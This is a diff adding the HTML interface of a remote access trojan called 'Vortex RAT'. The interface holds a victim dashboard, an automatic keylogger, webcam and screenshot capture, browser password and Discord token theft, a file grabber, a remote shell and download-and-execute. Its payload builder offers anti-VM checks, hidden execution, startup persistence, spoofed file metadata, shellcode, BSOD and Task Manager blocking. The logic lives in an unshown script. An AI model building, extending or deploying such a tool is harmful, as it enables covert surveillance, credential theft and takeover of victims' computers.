@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vortex RAT</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <div class="titlebar">
+    <div class="titlebar-brand">
+      <div class="titlebar-logo vortex-glow">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="none" stroke="#dc2626" stroke-width="1.5"/>
+          <path d="M12 6C9 6 6 9 6 12s3 6 6 6c-2 0-4-2-4-4s2-4 4-4c2 0 4 2 4 4s-2 4-4 4c3 0 6-3 6-6s-3-6-6-6z" fill="#dc2626" opacity="0.8"/>
+          <circle cx="12" cy="12" r="2" fill="#ff4444"/>
+        </svg>
+      </div>
+      <span class="titlebar-title">Vortex RAT</span>
+    </div>
+    <div class="titlebar-controls">
+      <button class="titlebar-btn" id="btn-minimize" onclick="windowControl('minimize')">─</button>
+      <button class="titlebar-btn" id="btn-maximize" onclick="windowControl('maximize')">☐</button>
+      <button class="titlebar-btn close" id="btn-close" onclick="windowControl('close')">✕</button>
+    </div>
+  </div>
+
+  <div class="app-container">
+    <div class="nav-tabs">
+      <button class="nav-tab active" data-tab="dashboard" id="tab-dashboard">
+        <span class="tab-icon">📊</span> Dashboard
+      </button>
+      <button class="nav-tab" data-tab="task-activity" id="tab-task-activity">
+        <span class="tab-icon">📋</span> Task Activity
+      </button>
+      <button class="nav-tab" data-tab="thumbnail" id="tab-thumbnail">
+        <span class="tab-icon">🖼️</span> Thumbnail
+      </button>
+      <button class="nav-tab" data-tab="auto-task" id="tab-auto-task">
+        <span class="tab-icon">⚡</span> Automatically Task
+      </button>
+      <button class="nav-tab" data-tab="password-recovery" id="tab-password-recovery">
+        <span class="tab-icon">🔑</span> Password Recovery
+      </button>
+      <button class="nav-tab" data-tab="file-grabber" id="tab-file-grabber">
+        <span class="tab-icon">📁</span> File Grabber
+      </button>
+      <button class="nav-tab special" data-tab="builder" id="tab-builder">
+        <span class="tab-icon">⚙️</span> Builder Settings
+      </button>
+    </div>
+
+    <div class="content-area">
+
+      <div class="tab-content active" id="content-dashboard">
+        <div class="card" style="margin-bottom:16px;">
+          <div class="card-header">
+            <div class="header-icon">🔌</div>
+            <h3>Server Control</h3>
+          </div>
+          <div class="card-body">
+            <div class="form-row" style="align-items:center;">
+              <div class="form-group" style="flex:0;">
+                <button class="btn btn-success" id="btn-start-server" onclick="startServer()">▶ Start Server</button>
+              </div>
+              <div class="form-group" style="flex:0;">
+                <button class="btn btn-danger" id="btn-stop-server" onclick="stopServer()">■ Stop Server</button>
+              </div>
+              <div class="form-group" style="flex:1;">
+                <input type="text" class="form-input" id="listen-ports" placeholder="Ports (comma separated)" value="4444,4449">
+              </div>
+              <div class="form-group" style="flex:0;">
+                <span id="server-status-text" style="font-size:12px;color:var(--text-muted);">Stopped</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="dashboard-grid">
+          <div class="stat-card">
+            <div class="stat-value" id="stat-online">0</div>
+            <div class="stat-label">Online Clients</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="stat-total">0</div>
+            <div class="stat-label">Total Connections</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="stat-tasks">0</div>
+            <div class="stat-label">Active Tasks</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="stat-upload">0 MB</div>
+            <div class="stat-label">Upload</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="stat-download">0 MB</div>
+            <div class="stat-label">Download</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="header-icon">👥</div>
+            <h3>Connected Clients</h3>
+          </div>
+          <div class="card-body">
+            <div class="table-wrapper">
+              <table class="data-table" id="clients-table">
+                <thead>
+                  <tr>
+                    <th style="width:30px;"><input type="checkbox" id="select-all-clients" onchange="selectAllClients(this.checked)"></th>
+                    <th>IP Address</th>
+                    <th>Username</th>
+                    <th>OS</th>
+                    <th>Country</th>
+                    <th>Group</th>
+                    <th>Status</th>
+                    <th>Ping</th>
+                  </tr>
+                </thead>
+                <tbody id="clients-tbody"></tbody>
+              </table>
+            </div>
+            <div class="empty-state" id="dashboard-empty">
+              <div class="empty-icon">🌐</div>
+              <p>No clients connected</p>
+              <p class="sub">Start the server and wait for incoming connections...</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-content" id="content-task-activity">
+        <div class="card">
+          <div class="card-header">
+            <div class="header-icon">📋</div>
+            <h3>Task Activity Log</h3>
+            <div style="margin-left:auto;">
+              <button class="btn btn-ghost" onclick="clearLog()" style="font-size:11px;">🗑️ Clear</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div class="log-container" id="task-log"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-content" id="content-thumbnail">
+        <div class="card">
+          <div class="card-header">
+            <div class="header-icon">🖼️</div>
+            <h3>Client Thumbnails</h3>
+            <div style="margin-left:auto;">
+              <button class="btn btn-primary" onclick="requestAllScreenshots()" style="font-size:11px;">📸 Capture All</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div class="thumbnail-grid" id="thumbnail-container"></div>
+            <div class="empty-state" id="thumbnail-empty">
+              <div class="empty-icon">🖥️</div>
+              <p>No thumbnails available</p>
+              <p class="sub">Thumbnails will appear when clients are connected</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-content" id="content-auto-task">
+        <div class="card">
+          <div class="card-header">
+            <div class="header-icon">⚡</div>
+            <h3>Automatic Tasks</h3>
+            <div style="margin-left:auto;">
+              <button class="btn btn-primary" onclick="saveAutoTasks()" style="font-size:11px;">💾 Save</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <p style="font-size:12px;color:var(--text-secondary);margin-bottom:16px;">These tasks run automatically when a new client connects.</p>
+            <div class="options-grid" style="gap: 16px;">
+              <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                <input type="checkbox" id="auto-keylogger">
+                <div class="checkbox-custom"></div>
+                <span class="checkbox-label">Auto Keylogger</span>
+              </div>
+              <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                <input type="checkbox" id="auto-screenshot">
+                <div class="checkbox-custom"></div>
+                <span class="checkbox-label">Auto Screenshot</span>
+              </div>
+              <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                <input type="checkbox" id="auto-passwords">
+                <div class="checkbox-custom"></div>
+                <span class="checkbox-label">Auto Password Recovery</span>
+              </div>
+              <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                <input type="checkbox" id="auto-clipboard">
+                <div class="checkbox-custom"></div>
+                <span class="checkbox-label">Auto Clipboard Monitor</span>
+              </div>
+              <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                <input type="checkbox" id="auto-webcam">
+                <div class="checkbox-custom"></div>
+                <span class="checkbox-label">Auto Webcam Capture</span>
+              </div>
+              <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                <input type="checkbox" id="auto-filegrab">
+                <div class="checkbox-custom"></div>
+                <span class="checkbox-label">Auto File Grabber</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-content" id="content-password-recovery">
+        <div class="card">
+          <div class="card-header">
+            <div class="header-icon">🔑</div>
+            <h3>Password Recovery</h3>
+          </div>
+          <div class="card-body">
+            <div class="controls-row" style="display:flex; gap:10px; margin-bottom:16px;">
+              <button class="btn btn-primary" onclick="recoverPasswords('all')">
+                <span>🔓</span> Recover All
+              </button>
+              <button class="btn btn-ghost" onclick="recoverPasswords('selected')">
+                <span>🎯</span> Selected Only
+              </button>
+            </div>
+            <div class="table-wrapper">
+              <table class="data-table">
+                <thead>
+                  <tr>
+                    <th>Client</th>
+                    <th>Application</th>
+                    <th>Info</th>
+                    <th>Path</th>
+                  </tr>
+                </thead>
+                <tbody id="passwords-tbody"></tbody>
+              </table>
+            </div>
+            <div class="empty-state" id="passwords-empty">
+              <div class="empty-icon">🔒</div>
+              <p>No passwords recovered yet</p>
+              <p class="sub">Select clients and click recover to start</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-content" id="content-file-grabber">
+        <div class="card">
+          <div class="card-header">
+            <div class="header-icon">📁</div>
+            <h3>File Grabber</h3>
+          </div>
+          <div class="card-body">
+            <div class="form-row" style="margin-bottom:16px;">
+              <div class="form-group" style="flex:2;">
+                <label class="form-label">File Extensions</label>
+                <input type="text" class="form-input" placeholder=".txt, .doc, .pdf, .xlsx, .jpg" value=".txt,.doc,.pdf,.xlsx" id="grab-extensions">
+              </div>
+              <div class="form-group" style="flex:1;">
+                <label class="form-label">Max Size (MB)</label>
+                <input type="number" class="form-input" value="10" id="grab-maxsize">
+              </div>
+            </div>
+            <div class="form-group" style="margin-bottom:16px;">
+              <label class="form-label">Search Directories</label>
+              <div class="options-grid">
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" checked id="grab-desktop">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">Desktop</span>
+                </div>
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" checked id="grab-documents">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">Documents</span>
+                </div>
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" id="grab-downloads">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">Downloads</span>
+                </div>
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" id="grab-pictures">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">Pictures</span>
+                </div>
+              </div>
+            </div>
+            <div style="margin-bottom:16px;">
+              <button class="btn btn-primary" onclick="startFileGrab('all')">
+                <span>📥</span> Grab from All
+              </button>
+              <button class="btn btn-ghost" onclick="startFileGrab('selected')" style="margin-left:8px;">
+                <span>🎯</span> Grab from Selected
+              </button>
+            </div>
+            <div class="table-wrapper">
+              <table class="data-table">
+                <thead>
+                  <tr>
+                    <th>Client</th>
+                    <th>Filename</th>
+                    <th>Path</th>
+                    <th>Size</th>
+                  </tr>
+                </thead>
+                <tbody id="files-tbody"></tbody>
+              </table>
+            </div>
+            <div class="empty-state" id="files-empty">
+              <div class="empty-icon">📂</div>
+              <p>No files grabbed yet</p>
+              <p class="sub">Configure settings and start grabbing</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-content" id="content-builder">
+        <div class="builder-grid">
+
+          <div class="card">
+            <div class="card-header">
+              <div class="header-icon">🖥️</div>
+              <h3>Server IP</h3>
+            </div>
+            <div class="card-body">
+              <div class="ip-input-row">
+                <input type="text" class="form-input" placeholder="Enter IP address" value="127.0.0.1" id="input-server-ip">
+                <button class="btn-add" onclick="addIP()" title="Add IP">+</button>
+                <button class="btn-remove" onclick="removeIP()" title="Remove IP">−</button>
+              </div>
+              <div class="list-box" id="ip-list">
+                <div class="list-item selected" onclick="selectListItem(this)">127.0.0.1</div>
+              </div>
+              <div class="checkbox-wrapper" onclick="toggleCheck(this)" style="margin-top: 8px;">
+                <input type="checkbox" id="ip-by-link">
+                <div class="checkbox-custom"></div>
+                <span class="checkbox-label">Get IP By Link</span>
+              </div>
+              <input type="text" class="form-input" placeholder="https://pastebin.com/raw/..." value="https://pastebin.com/raw/LwxoLg4" id="input-ip-link" style="margin-top: 8px;">
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <div class="header-icon">🔌</div>
+              <h3>Server Port</h3>
+            </div>
+            <div class="card-body">
+              <div class="ip-input-row">
+                <div class="number-input-group" style="flex:1;">
+                  <button onclick="adjustPort(-1)">−</button>
+                  <input type="number" value="4444" id="input-server-port" style="flex:1;">
+                  <button onclick="adjustPort(1)">+</button>
+                </div>
+                <button class="btn-add" onclick="addPort()" title="Add Port">+</button>
+                <button class="btn-remove" onclick="removePort()" title="Remove Port">−</button>
+              </div>
+              <div class="list-box" id="port-list">
+                <div class="list-item selected" onclick="selectListItem(this)">4449</div>
+                <div class="list-item" onclick="selectListItem(this)">4444</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <div class="header-icon">ℹ️</div>
+              <h3>Exe Information</h3>
+            </div>
+            <div class="card-body">
+              <div style="display:flex; gap:12px; align-items:flex-start; margin-bottom:16px;">
+                <div style="flex:1;">
+                  <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                    <input type="checkbox" id="chk-icon">
+                    <div class="checkbox-custom"></div>
+                    <span class="checkbox-label">Icon</span>
+                  </div>
+                  <div style="display:flex; align-items:center; gap:10px; margin-top:10px;">
+                    <div class="icon-upload" id="icon-preview" onclick="document.getElementById('icon-file').click()">🖼️</div>
+                    <input type="file" id="icon-file" accept=".ico,.png,.jpg" style="display:none;">
+                  </div>
+                </div>
+                <div style="flex:1.5;">
+                  <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                    <input type="checkbox" id="chk-assembly">
+                    <div class="checkbox-custom"></div>
+                    <span class="checkbox-label">Assembly</span>
+                  </div>
+                  <button class="btn btn-ghost" style="margin-top:10px; font-size:11px;" id="btn-clone">
+                    <span>📋</span> Clone
+                  </button>
+                </div>
+              </div>
+              <div class="assembly-grid">
+                <span class="assembly-label">Product:</span>
+                <input type="text" class="assembly-input" id="asm-product">
+                <span class="assembly-label">Description:</span>
+                <input type="text" class="assembly-input" id="asm-description">
+                <span class="assembly-label">Company:</span>
+                <input type="text" class="assembly-input" id="asm-company">
+                <span class="assembly-label">Copyright:</span>
+                <input type="text" class="assembly-input" id="asm-copyright">
+                <span class="assembly-label">Trademarks:</span>
+                <input type="text" class="assembly-input" id="asm-trademarks">
+                <span class="assembly-label">Original Filename:</span>
+                <input type="text" class="assembly-input" id="asm-filename">
+                <span class="assembly-label">Product Version:</span>
+                <input type="text" class="assembly-input" value="1.0.0.0" id="asm-prodversion">
+                <span class="assembly-label">File Version:</span>
+                <input type="text" class="assembly-input" value="1.0.0.0" id="asm-fileversion">
+              </div>
+            </div>
+          </div>
+
+          <div class="card two-cols">
+            <div class="card-header">
+              <div class="header-icon">⚙️</div>
+              <h3>Options</h3>
+            </div>
+            <div class="card-body">
+              <div class="form-row" style="margin-bottom: 14px;">
+                <div class="form-group">
+                  <label class="form-label">Group Name</label>
+                  <input type="text" class="form-input" value="Default" id="input-group-name">
+                </div>
+                <div class="form-group" style="flex:0;">
+                  <label class="form-label">&nbsp;</label>
+                  <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                    <input type="checkbox" id="chk-bsod">
+                    <div class="checkbox-custom"></div>
+                    <span class="checkbox-label">BSOD</span>
+                  </div>
+                </div>
+                <div class="form-group" style="flex:0;">
+                  <label class="form-label">&nbsp;</label>
+                  <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                    <input type="checkbox" id="chk-startup">
+                    <div class="checkbox-custom"></div>
+                    <span class="checkbox-label">Enable Startup</span>
+                  </div>
+                </div>
+                <div class="form-group" style="flex:0;">
+                  <label class="form-label">&nbsp;</label>
+                  <button class="btn-shellcode" id="btn-shellcode">
+                    <span>✏️</span> Shellcode
+                  </button>
+                </div>
+              </div>
+              <div class="form-row" style="margin-bottom: 14px;">
+                <div class="form-group">
+                  <label class="form-label">Mutex</label>
+                  <input type="text" class="form-input" id="input-mutex" placeholder="Auto-generated if empty">
+                </div>
+              </div>
+              <div class="form-row" style="margin-bottom: 14px;">
+                <div class="form-group" style="flex:2;">
+                  <label class="form-label">File Path</label>
+                  <select class="form-select" id="select-filepath">
+                    <option>%AppData%</option>
+                    <option>%Temp%</option>
+                    <option>%LocalAppData%</option>
+                    <option>%ProgramData%</option>
+                    <option>%UserProfile%</option>
+                  </select>
+                </div>
+                <div class="form-group" style="flex:0;">
+                  <label class="form-label">Sleep (s)</label>
+                  <div class="number-input-group">
+                    <button onclick="adjustSleep(-1)">−</button>
+                    <input type="number" value="1" id="input-sleep">
+                    <button onclick="adjustSleep(1)">+</button>
+                  </div>
+                </div>
+              </div>
+              <div class="options-row">
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" id="chk-antivm">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">Anti-VM</span>
+                </div>
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" id="chk-blocktm">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">Block Task Manager</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <div class="header-icon">🔨</div>
+              <h3>Build</h3>
+            </div>
+            <div class="card-body">
+              <div class="form-group" style="margin-bottom: 14px;">
+                <label class="form-label">Architecture</label>
+                <div class="radio-group">
+                  <label class="radio-wrapper">
+                    <input type="radio" name="arch" value="anycpu" checked>
+                    <div class="radio-custom"></div>
+                    <span class="radio-label">Any CPU</span>
+                  </label>
+                  <label class="radio-wrapper">
+                    <input type="radio" name="arch" value="x86">
+                    <div class="radio-custom"></div>
+                    <span class="radio-label">x86</span>
+                  </label>
+                  <label class="radio-wrapper">
+                    <input type="radio" name="arch" value="x64">
+                    <div class="radio-custom"></div>
+                    <span class="radio-label">x64</span>
+                  </label>
+                </div>
+              </div>
+              <div class="form-group" style="margin-bottom: 14px;">
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" id="chk-no-console">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">No Console (Run Hidden)</span>
+                </div>
+              </div>
+              <div class="form-group" style="margin-bottom: 14px;">
+                <div class="checkbox-wrapper" onclick="toggleCheck(this)">
+                  <input type="checkbox" id="chk-build-exe">
+                  <div class="checkbox-custom"></div>
+                  <span class="checkbox-label">Build as EXE (Requires 'pkg')</span>
+                </div>
+              </div>
+              <div style="display:flex; gap:10px; flex-wrap:wrap;">
+                <button class="btn-build" onclick="buildClient()" id="btn-build">
+                  <span>🔨</span> Build
+                </button>
+                <button class="btn btn-ghost" onclick="openBuildsFolder()" style="align-self:center;">
+                  📂 Open Builds Folder
+                </button>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+
+    <div class="status-bar">
+      <div class="status-left">
+        <div class="status-item">
+          <div class="status-dot" id="server-dot"></div>
+          <span>Online <strong id="status-online">0</strong></span>
+        </div>
+        <div class="status-item">
+          Selected <strong id="status-selected">0</strong>
+        </div>
+      </div>
+      <div class="status-right">
+        <div class="status-item">Upload MB <strong id="status-upload">0B</strong></div>
+        <div class="status-item">Download MB <strong id="status-download">0B</strong></div>
+        <div class="status-item">Server CPU <strong id="status-cpu">0%</strong></div>
+        <div class="status-item">Server Memory <strong id="status-memory">0%</strong></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="modal-overlay" onclick="closeModal()"></div>
+  
+  <div class="modal" id="modal-confirm-uninstall" style="width: 400px; height: auto;">
+    <div class="modal-header">
+      <h3>⚠️ Confirm Uninstall</h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body" style="text-align: center; padding: 30px 20px;">
+      <p style="margin-bottom: 20px; font-size: 14px; color: var(--text-primary);">Are you sure you want to uninstall the client from this computer? This action cannot be undone.</p>
+      <div style="display: flex; gap: 10px; justify-content: center;">
+        <button class="btn btn-danger" onclick="confirmUninstall()">Yes, Uninstall</button>
+        <button class="btn btn-ghost" onclick="closeModal()">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="modal" id="modal-screenshot" style="width: 800px; height: 600px;">
+    <div class="modal-header">
+      <h3 id="ss-client-name">Screenshot</h3>
+      <div style="display:flex; gap:10px; align-items:center;">
+        <label class="checkbox-wrapper" style="margin:0;">
+          <input type="checkbox" id="chk-ss-live" onchange="toggleLiveScreenshot(this)">
+          <div class="checkbox-custom"></div>
+          <span class="checkbox-label" style="font-size:12px;">🔴 Live Stream</span>
+        </label>
+        <button class="modal-close" onclick="closeModal()">✕</button>
+      </div>
+    </div>
+    <div class="modal-body" style="display: flex; flex-direction: column; height: 100%; padding: 0;">
+      <div class="ss-viewer" style="flex:1; background:#000; display:flex; align-items:center; justify-content:center; overflow:hidden;">
+        <img id="ss-image" src="" style="max-width:100%; max-height:100%; object-fit:contain;">
+      </div>
+      <div class="ss-controls" style="padding:10px; background:var(--bg-input); display:flex; justify-content:center; gap:10px;">
+        <button class="btn btn-primary" onclick="requestScreenshot()" id="btn-ss-refresh">
+          📸 Refresh
+        </button>
+        <button class="btn btn-ghost" onclick="saveScreenshot()">
+          💾 Save
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-shell">
+    <div class="modal-header">
+      <h3>💻 Remote Shell — <span id="shell-client-name"></span></h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="shell-output" id="shell-output"></div>
+      <div class="shell-input-row">
+        <span class="shell-prompt">$&gt;</span>
+        <input type="text" class="shell-input" id="shell-input" placeholder="Type command..." onkeydown="if(event.key==='Enter')sendShellCommand()">
+        <button class="btn btn-primary" onclick="sendShellCommand()">Send</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal modal-lg" id="modal-filemanager">
+    <div class="modal-header">
+      <h3>📁 File Manager — <span id="fm-client-name"></span></h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="fm-toolbar">
+        <button class="btn btn-ghost" onclick="fmNavigateUp()">⬆ Up</button>
+        <input type="text" class="form-input" id="fm-path-input" style="flex:1;" onkeydown="if(event.key==='Enter')fmNavigate()">
+        <button class="btn btn-primary" onclick="fmNavigate()">Go</button>
+        <button class="btn btn-ghost" onclick="fmRefresh()">🔄</button>
+        <button class="btn btn-ghost" onclick="fmUploadFile()">⬆ Upload</button>
+      </div>
+      <div class="fm-file-list" id="fm-file-list"></div>
+    </div>
+  </div>
+
+  <div class="modal modal-lg" id="modal-process">
+    <div class="modal-header">
+      <h3>📊 Process Manager — <span id="proc-client-name"></span></h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div style="margin-bottom:10px; display:flex; gap:10px;">
+        <input type="text" class="form-input" id="proc-search" placeholder="Search process..." oninput="filterProcesses()" style="flex:1;">
+        <button class="btn btn-primary" onclick="refreshProcesses()">🔄 Refresh</button>
+      </div>
+      <div class="table-wrapper" style="max-height:400px;overflow-y:auto;">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Process Name</th>
+              <th>PID</th>
+              <th>Memory</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="proc-tbody"></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal modal-lg" id="modal-screenshot">
+    <div class="modal-header">
+      <h3>📸 Screenshot — <span id="ss-client-name"></span></h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body" style="text-align:center;">
+      <img id="ss-image" style="max-width:100%;max-height:500px;border-radius:8px;border:1px solid var(--border-primary);">
+      <div style="margin-top:12px;">
+        <button class="btn btn-primary" onclick="refreshScreenshot()">📸 Capture Again</button>
+        <button class="btn btn-ghost" onclick="saveScreenshot()" style="margin-left:8px;">💾 Save</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-keylogger">
+    <div class="modal-header">
+      <h3>⌨️ Keylogger — <span id="kl-client-name"></span></h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div style="margin-bottom:10px; display:flex; gap:10px;">
+        <button class="btn btn-success" onclick="startKeylogger()">▶ Start</button>
+        <button class="btn btn-danger" onclick="stopKeylogger()">■ Stop</button>
+        <button class="btn btn-ghost" onclick="clearKeylog()">🗑️ Clear</button>
+      </div>
+      <div class="shell-output" id="keylog-output" style="min-height:250px;"></div>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-sysinfo">
+    <div class="modal-header">
+      <h3>🖥️ System Info — <span id="sysinfo-client-name"></span></h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="assembly-grid" id="sysinfo-grid" style="gap:6px 12px;"></div>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-msgbox">
+    <div class="modal-header">
+      <h3>💬 Send Message Box</h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="form-group">
+        <label class="form-label">Title</label>
+        <input type="text" class="form-input" id="msgbox-title" value="Alert">
+      </div>
+      <div class="form-group">
+        <label class="form-label">Message</label>
+        <textarea class="form-input" id="msgbox-text" rows="3" style="resize:vertical;"></textarea>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Icon</label>
+        <select class="form-select" id="msgbox-icon">
+          <option value="info">ℹ️ Information</option>
+          <option value="warning">⚠️ Warning</option>
+          <option value="error">❌ Error</option>
+          <option value="question">❓ Question</option>
+        </select>
+      </div>
+      <button class="btn btn-primary" onclick="sendMessageBox()" style="margin-top:10px;">📨 Send</button>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-dlexec">
+    <div class="modal-header">
+      <h3>⬇️ Download & Execute</h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="form-group">
+        <label class="form-label">URL</label>
+        <input type="text" class="form-input" id="dlexec-url" placeholder="https://example.com/file.exe">
+      </div>
+      <button class="btn btn-primary" onclick="sendDownloadExecute()" style="margin-top:10px;">⬇️ Download & Execute</button>
+    </div>
+  </div>
+
+  <div class="modal" id="modal-openurl">
+    <div class="modal-header">
+      <h3>🌐 Open URL</h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="form-group">
+        <label class="form-label">URL</label>
+        <input type="text" class="form-input" id="openurl-url" placeholder="https://example.com">
+      </div>
+      <button class="btn btn-primary" onclick="sendOpenUrl()" style="margin-top:10px;">🌐 Open on Client</button>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <div class="context-menu" id="context-menu">
+    <div class="context-item" onclick="ctxAction('remote-desktop')">📸 Screenshot</div>
+    <div class="context-item" onclick="ctxAction('file-manager')">📁 File Manager</div>
+    <div class="context-item" onclick="ctxAction('process-manager')">📊 Process Manager</div>
+    <div class="context-divider"></div>
+    <div class="context-item" onclick="ctxAction('shell')">💻 Remote Shell</div>
+    <div class="context-item" onclick="ctxAction('keylogger')">⌨️ Keylogger</div>
+    <div class="context-item" onclick="ctxAction('clipboard')">📋 Get Clipboard</div>
+    <div class="context-divider"></div>
+    <div class="context-item" onclick="ctxAction('passwords')">🔑 Grab Browser Data</div>
+    <div class="context-item" onclick="ctxAction('discord-tokens')">🎮 Discord Tokens</div>
+    <div class="context-divider"></div>
+    <div class="context-item" onclick="ctxAction('sysinfo')">🖥️ System Info</div>
+    <div class="context-item" onclick="ctxAction('msgbox')">💬 Message Box</div>
+    <div class="context-item" onclick="ctxAction('open-url')">🌐 Open URL</div>
+    <div class="context-item" onclick="ctxAction('dl-execute')">⬇️ Download & Execute</div>
+    <div class="context-divider"></div>
+    <div class="context-item" onclick="ctxAction('shutdown')">⏻ Shutdown</div>
+    <div class="context-item" onclick="ctxAction('restart')">🔄 Restart</div>
+    <div class="context-item" onclick="ctxAction('logoff')">🚪 Log Off</div>
+    <div class="context-item" onclick="ctxAction('bsod')">💀 BSOD</div>
+    <div class="context-divider"></div>
+    <div class="context-item" style="color:var(--red-400);" onclick="ctxAction('uninstall-ask')">🗑️ Uninstall</div>
+  </div>
+
+  <script src="renderer.js"></script>
+</body>
+</html>
